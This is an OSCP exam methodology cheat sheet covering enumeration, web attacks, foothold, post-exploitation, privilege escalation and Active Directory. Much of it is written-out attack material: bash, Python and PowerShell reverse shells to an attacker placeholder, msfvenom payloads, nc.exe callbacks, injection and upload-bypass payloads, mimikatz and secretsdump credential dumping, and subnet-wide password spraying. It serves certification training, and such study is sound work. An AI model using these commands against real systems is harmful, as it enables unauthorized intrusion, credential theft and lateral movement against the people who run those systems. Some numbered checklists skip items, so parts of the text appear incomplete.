---
title: "OSCP Methodology Overview"
date: 2026-06-20
weight: 10
draft: false
summary: "A master checklist that follows the exam-day workflow from start to finish."
---

A master checklist that follows the exam-day workflow from start to finish.

- Source: https://heretek.dev/oscp-cheatsheet/methodology/ (Jean Romero) — reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP

## Mentor tip — always escape `!` in passwords

```bash
# Passwords containing " ! " must be escaped as \!
# Even wrapped in ' ', the ! is not read correctly when the command runs.

nxc smb 10.10.10.10 -u offsec -p "Password1\!"
# 'Password1!' does not work correctly.
```

## Emergency quick-reference when stuck

- Foothold failing for 30 minutes → re-read the nmap output. Search every version. Try default accounts. Check UDP. Try POST on APIs. Check hidden paths and comments in page source.
- Have a shell but stuck on privesc → look for odd directories with `dir C:\` / `Get-ChildItem C:\` / `ls /`. Check localhost services with `netstat -ano` / `ss -tulnp`. Read every file in home directories. Crack protected files. Run pspy64 (Linux). Check PS history (Windows).
- AD — stuck after initial creds → transcript grep is the top priority: `smbclient //IP/share -c 'recurse ON'` then `ls` → grep `_.ps1/*.txt/*.log` for ConvertTo-SecureString and PSCredential. Read all non-default SMB shares. Then BloodHound, Kerberoast/AS-REP, password spraying, ADCS, delegation.
- Exploit not working → check architecture (32/64-bit). Read the code. Fix hardcoded IP/port/path. Try cross-compiling. Check for bad characters. Try the nc.exe pattern instead of an msfvenom exe.
- When to move on → don't spend more than 2 hours on one box. Take a break and come back with fresh eyes. 70 points is a pass — you can skip one standalone.

## PHASE 0 — Exam setup (first 10 minutes)

```bash
export ip=<TARGET_IP>
script -a /home/kali/oscp/exam_log_$(date +%F).txt

# Start the tool HTTP server right now — in a separate terminal tab
# (so the working directory doesn't change)
python3 -m http.server 80 -d ~/Tools &
# Prepare in ~/Tools: linpeas.sh, winpeas.exe, chisel, chisel.exe,
#   nc.exe, SharpHound.exe, PowerView.ps1, pspy64, GodPotato.exe, PrintSpoofer64.exe

# AD set — DNS and time sync
sudo ntpdate <DC_IP>
# Add all names from nmap (FQDN + domain + hostname) to /etc/hosts on one line
echo "<DC_IP> dc.domain.local domain.local dc" | sudo tee -a /etc/hosts
# resolv.conf: keep 8.8.8.8 for internet. DC goes only in /etc/hosts.
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
```

Passing combinations (70 points to pass):

- AD full (40) + standalone full (20) + standalone initial (10) = 70 pass
- AD partial (30) + standalone full (40) x 2 = 70 pass
- AD full (40) + standalone full (40) x 2 = 80, with margin

AD has partial credit: workstation flag 10 points, DC 20 points.

Time budget:

- 0–1 hour: scan all machines. Run scans in parallel. Read results. Plan the attack order.
- 1–5 hours: AD set (40 points). BloodHound → Kerberoast → lateral movement → DC.
- 5–9 hours: standalone 1, 2.
- 9–11 hours: standalone 3 or retry a stuck box.
- 11–12 hours: while access is still alive, take screenshots + start report notes.
- 12–16 hours: keep exploiting. Rotate between stuck boxes.
- After 16 hours: wrap up. Confirm all screenshots are captured. Verify all proof flags.

Strategy: do the AD set first (40 points, most efficient). No more than 2 hours on one box. Immediately spray every credential you find across everything.

Report note: proof-flag screenshots use `whoami; hostname; ip a; cat proof.txt` (Linux) or `whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt` (Windows — semicolons instead of `&&`). Record every step — the report decides pass/fail. Take screenshots during the work, not later.

## PHASE 1 — Enumeration

### 1a. Port scans (run 3 at the same time)

```bash
# Terminal 1: fast full TCP scan
sudo nmap -Pn -p- --min-rate=1000 -T4 -oN fast_tcp.txt $ip

# Terminal 2: top 20 UDP
sudo nmap -Pn -sU --top-ports=20 -oN udp_top20.txt $ip

# Terminal 3: targeted scan (after the fast scan finishes)
ports=$(grep '^[0-9]' fast_tcp.txt | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
sudo nmap -A -Pn -sC -sV -p $ports -oA targeted $ip

# Vulnerability scan (run while doing manual enumeration)
sudo nmap -sV -p $ports --script "vuln" $ip -oN vuln.txt
```

### 1b. Per-port commands

Process every open port in order. Items marked `Common` = the most frequent foothold vectors.

- Common / 21 FTP: `ftp $ip` (anonymous:anonymous). Writable + overlaps the webroot → upload a webshell
- 22 SSH: record the version. Brute-force only when the username is certain. If a key is found, `ssh2john`
- 53 DNS: `dig AXFR @$ip <domain>`, `dnsrecon -d <domain> -n $ip -t std`
- Common / 80·443 HTTP: see PHASE 2 Web
- 88 Kerberos: `kerbrute userenum -d DOMAIN --dc $ip users.txt`
- 110·143 POP/IMAP: `telnet $ip 110` — USER/PASS/LIST/RETR
- Common / 111·2049 NFS: `showmount -e $ip`, after mounting check for no_root_squash
- 135 MSRPC: `rpcclient -U "" -N $ip -c 'enumdomusers; netshareenumall'`
- Common / 139·445 SMB: `enum4linux-ng -A $ip`, `smbclient -L //$ip -N`, `smbmap -H $ip`, `nmap --script smb-vuln* -p 445 $ip`. Download everything: `smbclient //$ip/share -N -c 'recurse;prompt;mget *'`
- Common / 161 SNMP: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip` → `snmpwalk -c <string> -v2c $ip`. Windows OIDs — users `1.3.6.1.4.1.77.1.2.25`, processes `1.3.6.1.2.1.25.4.2.1.2`, software `1.3.6.1.2.1.25.6.3.1.2`, TCP ports `1.3.6.1.2.1.6.13.1.3`
- Common / 389·636 LDAP: `ldapsearch -x -H ldap://$ip -s base namingcontexts` → enumerate with creds
- Common / 1433 MSSQL: `impacket-mssqlclient sa:password@$ip`, try xp_cmdshell
- 3306 MySQL: `mysql -h $ip -u root`, try without a password. Local via evil-winrm: `.\\mysql.exe -u root -e "SHOW DATABASES;"` (`-e` prevents hanging)
- 5432 Postgres: `psql -h $ip -U postgres`, try `COPY TO PROGRAM`
- Common / 5985·5986 WinRM: `evil-winrm -i $ip -u user -p pass` (5986 = SSL, add `-S`)
- 6379 Redis: `redis-cli -h $ip` — CONFIG GET dir, write a webshell
- 3389 RDP: `xfreerdp /u:user /p:pass /v:$ip /cert:ignore +clipboard`
- Common / 8080·8443 alternate web: same as 80/443. Check Tomcat (`tomcat:s3cret` at `/manager`), Jenkins (script console → Groovy shell), WebLogic

```bash
curl http://$ip:PORT/endpoint                # GET
curl -d "" -X POST http://$ip:PORT/endpoint  # POST (add content-length)
```

## PHASE 2 — Web Attacks

### Step 1 — Recon (run in parallel)

```bash
feroxbuster -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx,jsp,bak -C 404 -t 50
gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 50

# Check cgi-bin (Shellshock!)
gobuster dir -u http://$ip/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,pl,cgi -t 50

# Virtual hosts (when the domain name is known)
ffuf -u http://$ip/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>

# Nikto (background — slow but finds things)
nikto -h http://$ip -o nikto.txt &
```

Always check manually: `robots.txt`, `sitemap.xml`, `.git/HEAD`, `web.config`, `.env`, and page source (comments, JS files, hidden fields, version numbers)

### Step 2 — CMS?

```bash
wpscan --url http://$ip --enumerate p --plugins-detection aggressive  # WordPress
droopescan scan drupal -u http://$ip      # Drupal
```

For any CMS found → `searchsploit <CMS> <version>`

### Step 3 — Default accounts

Try on every login: `admin:admin`, `admin:password`, `admin:Password1`, `root:root`, `tomcat:s3cret`

### Step 4 — Parameter testing

Against every input/parameter you find:

- SQLi: `'`, `' OR 1=1-- -`, time-based `1' WAITFOR DELAY '0:0:5'-- -`
- XSS: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
- LFI: `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index`
- Command injection: `; id`, `| id`, `$(id)`, backticks
- SSTI: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` — if it renders as `49`, it's injectable

### Step 5 — File upload?

If you find an upload form:

- Upload a webshell matching the stack (`.php`, `.aspx`, `.jsp`)
- Bypass extension filters: double extensions (`shell.php.jpg`), mixed case (`.pHp`), alternate extensions (`.phtml`, `.php5`, `.phar`)
- Bypass Content-Type checks: set `Content-Type: image/png` in Burp, keep the body malicious
- Pass image validation: prepend a valid magic header (e.g., `GIF89a;`)
- Check the save location (`/uploads/`, `/files/`) → browse to it to execute

## PHASE 3 — Foothold

1. Known exploits — does a searchsploit result match the version? Read the code, modify it, run it
2. Default/weak creds — tried on every login, DB, and admin interface?
3. Web exploits — did Phase 2 find SQLi, LFI, upload, or command injection?
4. Credential reuse — try any creds you found on SSH, WinRM, RDP, SMB
5. Brute force (last resort) — only when the username is certain: `hydra -l user -P rockyou.txt ssh://$ip -t 4`

Reverse shell setup:

```bash
rlwrap nc -lvnp 443    # port 443 — 4444 is often blocked by firewalls
```

```bash
# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
# Python (Linux)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# PowerShell (Windows — when you can only run commands before uploading a file)
powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$s.Write(([Text.Encoding]::ASCII.GetBytes($t)),0,$t.Length);$s.Flush()};$c.Close()"
# msfvenom — 64-bit first
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell.exe
# 32-bit (when the target is x86 — check with `file` on Linux, `systeminfo` on Windows)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f elf -o shell32.elf
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell32.exe
```

## PHASE 4 — Post-Exploitation (immediately after every shell, every time)

Do all of this on every machine you land on, every time — not just the first machine.

### Step 1 — Stabilize the shell

Linux:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter Enter
export TERM=xterm-256color
stty rows 50 cols 200
```

Windows (raw cmd.exe shell received via nc.exe):

```powershell
# On the target: switch cmd → PowerShell:
powershell -ep bypass

# If the shell keeps dying — new callback with nc.exe (already uploaded in Step 2b):
C:\Windows\Temp\nc.exe KALI_IP 443 -e cmd.exe
# In another terminal on Kali: rlwrap nc -lvnp 443
```

### Step 2 — Identify + screenshot

```text
# Linux                        # Windows
whoami && id                   whoami /all
hostname                       hostname
ip a                           ipconfig /all
```

Screenshot immediately. On exam day you forget later.

### Step 2b — Upload tools to the target

The HTTP file server should already be running from Phase 0. If not: `cd ~/Tools && python3 -m http.server 80 &`

```bash
# Upload to Linux target
wget http://KALI/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
wget http://KALI/chisel -O /tmp/chisel && chmod +x /tmp/chisel
wget http://KALI/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
```

```powershell
# Upload to Windows target
certutil -urlcache -f http://KALI/winpeas.exe C:\Windows\Temp\winpeas.exe
certutil -urlcache -f http://KALI/chisel.exe C:\Windows\Temp\chisel.exe
certutil -urlcache -f http://KALI/nc.exe C:\Windows\Temp\nc.exe
# Fallback if certutil is blocked:
powershell -c "iwr http://KALI/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe"
# If using evil-winrm (built-in upload):
upload /home/kali/Tools/winpeas.exe C:\Windows\Temp\winpeas.exe
```

Download files from the target to Kali (winpeas results, loot, etc.):

```text
# Method 1: built into evil-winrm
*Evil-WinRM* PS> download C:\Windows\Temp\winpeas.txt .

# Method 2: SMB server on Kali (separate terminal)
impacket-smbserver smb $(pwd) -smb2support
# On target: copy C:\Windows\Temp\winpeas.txt \\KALI_IP\smb\winpeas.txt
```

### Step 3 — Grab the flags

```bash
cat /home/*/local.txt && cat /root/proof.txt 2>/dev/null          # Linux
```

```powershell
Get-ChildItem -Path C:\Users -Recurse -Filter local.txt -ErrorAction SilentlyContinue | Get-Content   # Windows
Get-ChildItem -Path C:\Users -Recurse -Filter proof.txt -ErrorAction SilentlyContinue | Get-Content
```

### Step 4 — Internal network + hidden services

Run on every machine you land on:

```text
# LINUX                            # WINDOWS
ip a                               ipconfig /all
ip route                           route print
arp -a                             arp -a
ss -tulnp                          netstat -ano | findstr LISTENING
```

Read the output and check three things.

### A) Two NICs? → pivoting needed

If `ip a` shows both `eth0: 192.168.x.x` and `eth1: 172.16.x.x`, this machine can see an internal network Kali can't reach. Tunneling is needed. Using Chisel:

```bash
# Kali terminal — start the Chisel server
./chisel server -p 9999 --reverse

# The Chisel binary must already be on the target from Step 2b.
# If not: download it from the python3 HTTP server on port 80.

# On the compromised machine — connect back
# Linux:
./chisel client KALI_IP:9999 R:socks
# Windows:
.\chisel.exe client KALI_IP:9999 R:socks

# Kali's /etc/proxychains4.conf — change the last line:
# socks5 127.0.0.1 1080

# Now every Kali tool works through the tunnel:
proxychains -q nmap -sT -Pn -p 80,445,5985,3389 INTERNAL_IP
proxychains -q curl http://INTERNAL_IP
proxychains -q evil-winrm -i INTERNAL_IP -u USER -p PASS
proxychains -q smbclient -L //INTERNAL_IP -U USER
```

Once the tunnel is open → return to PHASE 1 and enumerate the new subnet.

### B) Is a service listening only on 127.0.0.1? → port forward

If `netstat -ano` shows `127.0.0.1:8080 LISTENING`, the service is only reachable from this machine. Forward that port to Kali. Chisel (same tool as A, different syntax):

```bash
# The Chisel server must already be running from A. If not:
# ./chisel server -p 9999 --reverse

# On target — the chisel binary is already there from Step 2b.
# TIP: you can combine SOCKS + port forward in a single client connection:
# ./chisel client KALI_IP:9999 R:socks R:9090:127.0.0.1:8080
# target localhost:8080 → Kali localhost:9090
.\chisel.exe client KALI_IP:9999 R:9090:127.0.0.1:8080
# Linux: ./chisel client KALI_IP:9999 R:9090:127.0.0.1:8080

# Access the forwarded service from Kali
curl http://127.0.0.1:9090
# or in a browser: http://127.0.0.1:9090
```

- Chisel is a single binary you upload. No SSH or Socat is needed on the target.
- Forward multiple ports at once: `R:9090:127.0.0.1:8080 R:9091:127.0.0.1:3306`
- Replace 8080 and 9090 with the ports you found in netstat.

Common localhost services worth investigating: 80/8080 (web apps), 1433 (MSSQL), 3306 (MySQL), 5432 (Postgres).

Try direct interaction on the target before tunneling:

```powershell
# MySQL (from the directory containing mysql.exe, e.g., C:\xampp\mysql\bin)
.\mysql.exe -u root --password=""
.\mysql.exe -u root -e "SHOW DATABASES;"
.\mysql.exe -u root -e "USE dbname; SELECT * FROM users;"
# Evil-WinRM hangs at the interactive prompt — always use the -e flag

# Identify a process on an unknown port (no admin needed)
Get-Process -Id <PID> | Select-Object Name,Path
# Map all ports at once:
Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess,@{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).Name}} | Sort-Object LocalPort
```

### C) Neither?

Proceed to Step 5.

### Step 5 — Harvest creds + filesystem loot + add to the creds table

```bash
# Linux: bash history, config files, env vars, .git repositories
cat ~/.bash_history
env | grep -i pass
find / -name ".git" -type d 2>/dev/null
grep -ri 'password' /var/www/ /opt/ /home/ 2>/dev/null
```

```powershell
# Windows — works in both CMD and PS:
whoami /all
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
netstat -ano | findstr LISTENING

# CMD only (when the prompt is C:\>):
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Panther\unattend.xml 2>nul

# PS only (when the prompt is PS C:\>):
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue
Get-Content C:\inetpub\wwwroot\web.config -EA SilentlyContinue
Get-Content C:\Windows\Panther\unattend.xml -EA SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter *.kdbx -EA SilentlyContinue | Select FullName

# Hidden AppData — PS only (not visible via dir, and WinPEAS misses it):
Get-ChildItem -Path C:\Users\*\AppData -Recurse -Include *.xml,*.config,*.ini,*.txt,*.settings -Force -EA SilentlyContinue | Select-String -Pattern "password|credential|passwd" -List | Select Path
# Read what you find: Get-Content "<PATH>" -EA SilentlyContinue
```

```powershell
# Windows: check creds in local DBs (if MySQL/MSSQL was found in Step 4)
.\mysql.exe -u root -e "SHOW DATABASES;"
# Dump every non-default database:
.\mysql.exe -u root -e "USE creds; SHOW TABLES;"
.\mysql.exe -u root -e "USE creds; SELECT * FROM users;"
.\mysql.exe -u root -e "USE wordpress; SELECT user_login,user_pass FROM wp_users;"
```

Every credential you find → update the creds table → immediately spray everywhere.

```bash
# Create a file with all creds found so far
echo -e "administrator\ncharlotte\njohn" > users.txt
echo -e "Password1\nFound_Pass2" > passes.txt

# Spray every user × every password × every service × every IP
nxc smb <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
nxc winrm <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
nxc rdp <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
nxc mssql <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
```

Spraying every discovered credential against every service immediately is the habit that builds the chain.

### Step 6 — Privesc

→ PHASE 5 (Linux) or PHASE 6 (Windows)

### Step 7 — After getting root/admin (do this every time)

```bash
# 1. proof screenshot (4 items in one shot — do not skip)
# Linux:   whoami && hostname && ip a && cat /root/proof.txt
# Windows: whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt

# 2. Dump all creds (memory + registry)
# From Kali: impacket-secretsdump 'DOMAIN/USER:PASS'@TARGET_IP
# Windows:  mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
# Linux:    cat /etc/shadow

# Run the 8-item checklist. Catches creds that mimikatz/secretsdump miss:
# hash-bearing log files, plaintext cred text files, SSH keys, backup files, web configs

# 4. Re-check the internal network (root may see new interfaces)
# ip a / ipconfig /all — rerun Step 4

# 5. Spray new creds immediately
nxc smb ALL_IPS -u 'NEW_USER' -p 'NEW_PASS' --continue-on-success
```

## PHASE 5 — Linux Privilege Escalation

Check in order. The first 3 catch about 80% of vectors.

1. `sudo -l` → GTFOBins
2. SUID: `find / -perm -u=s -type f 2>/dev/null` → GTFOBins
3. Cron/timers: `cat /etc/crontab && ls -la /etc/cron.d/` + run `pspy64` → writable script? PATH hijack?
4. Capabilities: `getcap -r / 2>/dev/null` → cap_setuid means immediate root
5. LinPEAS: run `./linpeas.sh` and review the output → check RED/YELLOW items
6. Passwords: `grep -ri 'password' /var/www/ /opt/ /home/` + bash_history → credential reuse
7. SSH keys: `find / -name id_rsa 2>/dev/null` → SSH as another user
8. Writable /etc/passwd: `ls -la /etc/passwd` → add a root user
9. Internal services: `ss -tulnp` → localhost-only → Chisel forward → PHASE 4 Step 4B
10. NFS no_root_squash: `cat /etc/exports` → mount + SUID bash
11. Docker/LXD group: `id` → container escape
12. Kernel (last resort): `uname -a` + linux-exploit-suggester → PwnKit, DirtyPipe

## PHASE 6 — Windows Privilege Escalation

Identify the shell type: `C:\>` = CMD, `PS C:\>` = PowerShell. Commands below work in both unless noted. Switch with: `cmd` or `powershell -ep bypass`.

2. WinPEAS: `.\winpeas.exe cmd | Tee-Object -FilePath .\winpeas.txt` (PS) or `.\winpeas.exe cmd > winpeas.txt` (CMD) → check RED/YELLOW
3. Service misconfiguration: `wmic service get name,pathname,startmode` → unquoted path or writable binary → `sc config`
4. Saved creds: `cmdkey /list` → entry found → `runas /savecred`
5. PS history — CMD: `type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` / PS: `Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue` → credential reuse
6. AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` → msfvenom MSI
7. SAM/SYSTEM backup — CMD: `dir C:\Windows\Repair\SAM` / PS: `Get-ChildItem C:\Windows\Repair\SAM -EA SilentlyContinue` → secretsdump
8. Scheduled tasks: `schtasks /query /fo LIST /v` → writable script?
10. DLL hijacking — CMD: `echo %PATH%` / PS: `$env:PATH -split ';'` → writable directory on PATH → plant a DLL
11. Internal services: `netstat -ano | findstr LISTENING` → interact directly first (MySQL `-e`, curl) → if needed, Chisel tunnel → PHASE 4 Step 4B
12. UAC bypass: `whoami /groups` → Medium Mandatory + admin → fodhelper

Additional commands:

- CMD: `findstr /si "password" *.txt *.xml *.ini *.config` (run from the user's home, not C:\)
- PS: `Get-ChildItem -Recurse -Include *.txt,*.xml,*.ini,*.config -EA SilentlyContinue | Select-String "password" -List | Select Path`
- Both shells: `reg query HKLM /f password /t REG_SZ /s`

Quick reference for Potato attacks:

- Server 2016 and older: JuicyPotato
- Server 2019+ / Win10 1809+: PrintSpoofer
- Universal: GodPotato or SigmaPotato

```powershell
PrintSpoofer.exe -i -c cmd
GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe"
```

## Reading WinPEAS / LinPEAS output (don't read it all)

PEAS output runs to thousands of lines. Don't read it all — search specific sections.

### LinPEAS — check in this order

```bash
# Save to a file first
./linpeas.sh | tee linpeas.txt
# Then search for the important stuff:
grep -A5 '\[1\]' linpeas.txt                    # RED/YELLOW findings (top priority)
grep -A3 'sudo -l' linpeas.txt                  # sudo rights
grep -B2 -A2 'SUID' linpeas.txt                 # SUID binaries
grep -B2 -A5 'Cron' linpeas.txt                 # cron job
grep -A3 'Capabilities' linpeas.txt             # file capabilities
grep -B2 -A5 'password\|credential' linpeas.txt # passwords in files
grep -A3 'writable' linpeas.txt                 # writable files/directories
grep -A5 'docker\|lxd' linpeas.txt              # container escape
grep -A3 '127.0.0.1' linpeas.txt                # localhost-only services
```

Color guide: RED/YELLOW = almost certainly exploitable. RED = critical finding. GREEN = reference info.

### WinPEAS — check in this order

```powershell
# Save to a file (colors make terminal output unreadable — redirect)
.\winpeas.exe cmd > C:\Windows\Temp\winpeas.txt

# Download to Kali (SMB server or evil-winrm download), then search:
grep -A5 'Password\|credential\|AutoLogon' winpeas.txt
grep -A5 'SeImpersonate\|SeBackup\|SeDebug\|SeRestore' winpeas.txt
grep -A5 'Unquoted\|Modifiable' winpeas.txt      # service misconfigurations
grep -A5 'AlwaysInstallElevated' winpeas.txt
grep -A5 'PSReadLine\|ConsoleHost_history' winpeas.txt
grep -A5 'Unattend\|web.config\|SiteList' winpeas.txt
grep -B2 -A5 '127.0.0.1' winpeas.txt             # localhost services
grep -A3 'Backup Operators\|Server Operators\|DnsAdmins' winpeas.txt
```

Shortcut: run `winpeas.exe cmd` instead of `winpeas.exe` — the `cmd` flag gives clean output without ANSI colors, which break file redirection.

Don't read PEAS output top to bottom for 30 minutes. Grep the sections above, check the RED/YELLOW items, and move on.

## PHASE 7 — Active Directory (Assumed Breach)

### AD chain (memorize)

```text
1. Creds provided → BloodHound + netexec enumeration (Playbook Phase 1)
2. Kerberoast + AS-REP roast → crack → spray (Phase 2)
3. BloodHound check: ACL edges? ADCS? Delegation? (Phase 3-4)
4. Every machine where you get admin → secretsdump → spray new hashes (Phase 5-6)
5. Repeat 2-4 for every new cred
6. DA → DCSync → PtH to DC → proof.txt (Phase 9)
```

### AD reminders

- BloodHound first, always. Collect and check shortest paths before attacking.
- The creds table is everything. Update it with every secretsdump, crack, or config file found. Spray immediately.
- Check sessions: BloodHound custom query `MATCH p=(c:Computer)-[:HasSession]->(m:User) RETURN p` — shows where high-value users are logged in.
- Stuck? Re-run BloodHound queries. Read all SMB shares. Check ADCS. Retry Kerberoast with new users. Spray every password variant.

## Quick reference links (documents in this folder)

- Per-service enumeration → [enumeration.md](enumeration.md)
- Web app testing → [web-attacks.md](web-attacks.md), [sql-injection.md](sql-injection.md)
- Shell acquisition / file transfer → [shells-and-transfers.md](shells-and-transfers.md)
- Linux privesc → [linux-privilege-escalation.md](linux-privilege-escalation.md)
- Windows privesc → [windows-privilege-escalation.md](windows-privilege-escalation.md)
- Active Directory → [active-directory-playbook.md](active-directory-playbook.md), [active-directory-tools.md](active-directory-tools.md)
- Pivoting → [pivoting-and-tunneling.md](pivoting-and-tunneling.md), [ligolo-ng.md](ligolo-ng.md)
- Hash cracking → [hash-types.md](hash-types.md), [password-attacks.md](password-attacks.md)
- Buffer overflows → [buffer-overflows.md](buffer-overflows.md)
- Report writing → [report-writing.md](report-writing.md)
